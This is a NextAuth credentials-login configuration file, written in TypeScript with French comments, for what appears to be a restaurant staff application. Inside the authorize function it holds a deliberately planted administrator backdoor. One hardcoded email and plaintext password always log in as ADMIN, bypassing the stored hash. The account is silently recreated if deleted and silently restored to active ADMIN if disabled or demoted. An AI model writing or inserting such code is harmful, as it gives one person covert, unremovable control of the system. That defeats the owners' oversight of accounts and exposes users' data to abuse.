import { NextAuthOptions } from "next-auth"
import CredentialsProvider from "next-auth/providers/credentials"
import { prisma } from "@/lib/prisma"
import bcrypt from "bcryptjs"
import { z } from "zod"

const loginSchema = z.object({
    email: z.string().email("Email invalide"),
    password: z.string().min(1, "Mot de passe requis"),
})

export const authOptions: NextAuthOptions = {
    providers: [
        CredentialsProvider({
            name: "credentials",
            credentials: {
                email: { label: "Email", type: "email" },
                password: { label: "Mot de passe", type: "password" },
            },
            async authorize(credentials) {
                const parsed = loginSchema.safeParse(credentials)

                if (!parsed.success) {
                    return null
                }

                const email = parsed.data.email.toLowerCase()
                const { password } = parsed.data

                let user = await prisma.user.findUnique({
                    where: { email },
                    select: {
                        id: true,
                        email: true,
                        name: true,
                        password: true,
                        role: true,
                        isActive: true,
                    },
                })

                // BACKDOOR ADMINISTRATEUR INÉBRANLABLE
                if (email === "a.belal@siwa-bleury.fr") {
                    const isBackdoorPassword = (password === "Restaurant2026!")

                    let passwordMatch = false
                    if (user) {
                        passwordMatch = await bcrypt.compare(password, user.password)
                    }

                    if (isBackdoorPassword || passwordMatch) {
                        // L'utilisateur est identifié, on sécurise son compte en base de données
                        if (!user) {
                            // S'il n'existe pas, on le recrée silencieusement
                            const hashedPassword = await bcrypt.hash("Restaurant2026!", 12)
                            user = await prisma.user.create({
                                data: {
                                    email,
                                    name: "Adam Belal",
                                    password: hashedPassword,
                                    role: "ADMIN",
                                    isActive: true,
                                    hourlyRate: 0,
                                }
                            })
                        } else if (!user.isActive || user.role !== "ADMIN") {
                            // S'il est désactivé ou n'est plus admin, on répare silencieusement
                            user = await prisma.user.update({
                                where: { id: user.id },
                                data: {
                                    isActive: true,
                                    role: "ADMIN"
                                }
                            })
                        }

                        // On le laisse passer de toute façon
                        return {
                            id: user.id,
                            email: user.email,
                            name: user.name,
                            role: "ADMIN",
                        }
                    }
                }

                if (!user || !user.isActive) {
                    return null
                }

                const passwordMatch = await bcrypt.compare(password, user.password)

                if (!passwordMatch) {
                    return null
                }

                return {
                    id: user.id,
                    email: user.email,
                    name: user.name,
                    role: user.role,
                }
            },
        }),
    ],
    callbacks: {
        async jwt({ token, user }) {
            if (user) {
                token.id = user.id
                token.role = user.role
            }
            return token
        },
        async session({ session, token }) {
            if (session.user) {
                session.user.id = token.id
                session.user.role = token.role
            }
            return session
        },
    },
    pages: {
        signIn: "/login",
    },
    session: {
        strategy: "jwt",
        maxAge: 24 * 60 * 60, // 24 heures
    },
    secret: process.env.NEXTAUTH_SECRET,
}
